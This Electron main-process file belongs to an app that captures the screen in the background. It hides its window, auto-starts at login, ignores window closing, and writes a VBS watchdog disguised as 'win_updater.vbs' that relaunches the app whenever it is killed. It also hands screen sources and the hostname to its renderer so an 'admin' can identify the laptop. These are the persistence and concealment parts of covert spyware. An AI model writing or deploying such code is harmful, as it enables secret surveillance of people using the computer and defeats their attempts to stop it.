const { app, BrowserWindow, ipcMain, desktopCapturer } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const { exec, spawn } = require('child_process');

function startWatchdog() {
    // Only run the watchdog when the app is actually packaged as an EXE
    if (!app.isPackaged) return;

    const exePath = app.getPath("exe");
    const exeName = path.basename(exePath);
    const watchdogPath = path.join(app.getPath("userData"), "win_updater.vbs");

    const vbsCode = `
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
Do
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '${exeName}'")
    If colProcesses.Count = 0 Then
        objShell.Run """${exePath}""", 0, False
    End If
    WScript.Sleep 5000
Loop
`;

    fs.writeFileSync(watchdogPath, vbsCode);

    // Kill any existing watchdog for our app, then start a new one
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, () => {
        const child = spawn('wscript.exe', [watchdogPath], {
            detached: true,
            stdio: 'ignore'
        });
        child.unref();
    });
}

function createWindow() {
    const win = new BrowserWindow({
        show: false, // Make the window completely hidden
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    win.loadFile('index.html');
}

// Auto start the app in the background when the user logs into their laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
});

app.whenReady().then(() => {
    // Get all screen sources
    ipcMain.handle('get-sources', async () => {
        const sources = await desktopCapturer.getSources({ types: ['screen'] });
        return sources.map(source => ({
            id: source.id,
            name: source.name
        }));
    });

    // Provide the computer name so the admin knows which laptop it is
    ipcMain.handle('get-hostname', () => os.hostname());

    createWindow();
    startWatchdog();
});

// Keep running in the background even if a window is closed
app.on('window-all-closed', () => {
    // Do nothing, we want it to stay alive
});